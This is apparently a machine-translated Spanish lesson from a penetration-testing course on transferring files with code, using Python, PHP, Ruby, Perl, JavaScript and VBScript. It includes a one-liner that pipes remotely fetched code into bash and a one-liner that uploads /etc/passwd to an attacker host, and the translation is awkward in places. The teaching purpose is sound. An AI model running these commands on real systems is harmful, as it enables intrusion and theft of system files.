# Transferir archivos con código

Es común encontrar diferentes lenguajes de programación instalados en las máquinas que estamos aturdiendo. Los lenguajes de programación como Python, PHP, Perl y Ruby están comúnmente disponibles en distribuciones de Linux, pero también se pueden instalar en Windows, aunque esto es mucho menos común.

Podemos usar algunas aplicaciones predeterminadas de Windows, como`cscript`y`mshta`, para ejecutar el código JavaScript o VBScript. JavaScript también puede ejecutarse en hosts de Linux.

Según Wikipedia, hay alrededor[700 lenguajes de programación](https://en.wikipedia.org/wiki/List_of_programming_languages), y podemos crear código en cualquier idioma de programación, para descargar, cargar o ejecutar instrucciones al sistema operativo. Esta sección proporcionará algunos ejemplos utilizando lenguajes de programación comunes.

---

# **Pitón**

Python es un lenguaje de programación popular. Actualmente, la versión 3 es compatible, pero podemos encontrar servidores donde todavía existe la versión 2.7 de Python.`Python`pueden ejecutar una línea de una línea de comandos del sistema operativo utilizando la opción`-c`. Veamos algunos ejemplos:

### **Python 2 - Descargar**

Transferir archivos con código

```
xnoxos@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### **Python 3 - Descargar**

Transferir archivos con código

```
xnoxos@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---

# **Php**

`PHP`También es muy frecuente y proporciona múltiples métodos de transferencia de archivos.[De acuerdo con los datos de W3Techs](https://w3techs.com/technologies/details/pl-php)El 77.4% de todos los sitios web utiliza PHP con un lenguaje de programación del lado del servidor conocido. Aunque la información no es precisa, y el número puede ser ligeramente más bajo, a menudo encontraremos servicios web que usan PHP al realizar una operación ofensiva.

Veamos algunos ejemplos de descarga de archivos usando PHP.

En el siguiente ejemplo, usaremos el PHP[módulo file_get_contents ()](https://www.php.net/manual/en/function.file-get-contents.php)Para descargar contenido de un sitio web combinado con el[módulo file_put_contents ()](https://www.php.net/manual/en/function.file-put-contents.php)Para guardar el archivo en un directorio.`PHP`se puede usar para ejecutar una línea de una línea de comando del sistema operativo utilizando la opción`-r`.

### **Descargar PHP con file_get_contents ()**

Transferir archivos con código

```
xnoxos@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Una alternativa a`file_get_contents()`y`file_put_contents()`es el[módulo fopen ()](https://www.php.net/manual/en/function.fopen.php). Podemos usar este módulo para abrir una URL, leer su contenido y guardarlo en un archivo.

### **Descargar PHP con Fopen ()**

Transferir archivos con código

```
xnoxos@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

---

También podemos enviar el contenido descargado a una tubería, de manera similar al ejemplo sin archivo que ejecutamos en la sección anterior usando Curl y Wget.

### **Php descargue un archivo y vaya a Bash**

Transferring Files with Code

```
xnoxos@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Nota:**La URL se puede usar como nombre de archivo con la función @file si se habilitan los envoltorios Fopen.

---

# **Otros idiomas**

`Ruby`y`Perl`son otros idiomas populares que también se pueden usar para transferir archivos. Estos dos lenguajes de programación también admiten la ejecución de una línea de una línea de comandos del sistema operativo utilizando la opción`-e`.

---

### **Ruby - Descargar un archivo**

Transferir archivos con código

```
xnoxos@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

### **Perl - Descargar un archivo**

Transferir archivos con código

```
xnoxos@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

# **Javascript**

JavaScript es un lenguaje de secuencias de comandos o programación que le permite implementar características complejas en las páginas web. Al igual que con otros lenguajes de programación, podemos usarlo para muchas cosas diferentes.

El siguiente código JavaScript se basa en[este](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)Publica, y podemos descargar un archivo usandolo. Crearemos un archivo llamado`wget.js`y guarde el siguiente contenido:

Código:javascript

```jsx
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

```

Podemos usar el siguiente comando desde un símbolo del sistema de Windows o PowerShell Terminal para ejecutar nuestro código JavaScript y descargar un archivo.

### **Descargue un archivo usando JavaScript y cscript.exe**

Transferir archivos con código

```
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

```

---

# **VBscript**

[VBscript](https://en.wikipedia.org/wiki/VBScript)("Microsoft Visual Basic Scripting Edition") es un lenguaje de secuencias de comandos activo desarrollado por Microsoft que está modelado en Visual Basic. VBScript se ha instalado de forma predeterminada en cada versión de escritorio de Microsoft Windows desde Windows 98.

El siguiente ejemplo de VBScript se puede usar en base a[este](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). Crearemos un archivo llamado`wget.vbs`y guarde el siguiente contenido:

Código:vBscript

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

```

Podemos usar el siguiente comando desde un símbolo del sistema de Windows o PowerShell Terminal para ejecutar nuestro código VBScript y descargar un archivo.

### **Descargue un archivo usando VBScript y cscript.exe**

Transferir archivos con código

```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

```

---

# **Cargar operaciones con Python3**

Si queremos cargar un archivo, necesitamos comprender las funciones en un lenguaje de programación particular para realizar la operación de carga. El python3[Módulo de solicitudes](https://pypi.org/project/requests/)Le permite enviar solicitudes HTTP (obtener, publicar, poner, etc.) usando Python. Podemos usar el siguiente código si queremos subir un archivo a nuestro Python3[SuboadServer](https://github.com/Densaugeo/uploadserver).

### **Iniciar el módulo de servidor de carga de Python**

Transferir archivos con código

```
xnoxos@htb[/htb]$ python3 -m uploadserver File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

### **Cargar un archivo usando una línea Python One-Liner**

Transferir archivos con código

```
xnoxos@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Dividemos esta línea de una línea en múltiples líneas para comprender mejor cada pieza.

Código:pitón

```python
# To use the requests function, we need to import the module first.
import requests

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file.
r = requests.post(url,files={"files":file})

```

Podemos hacer lo mismo con cualquier otro lenguaje de programación. Una buena práctica es elegir una e intentar construir un programa de carga.

---

# **Resumen de la sección**

Comprender cómo podemos usar el código para descargar y cargar archivos puede ayudarnos a lograr nuestros objetivos durante un ejercicio de equipo rojo, una prueba de penetración, una competencia de CTF, un ejercicio de respuesta a incidentes, una investigación forense o incluso en nuestro trabajo sysadmin de sysadmin cotidiano.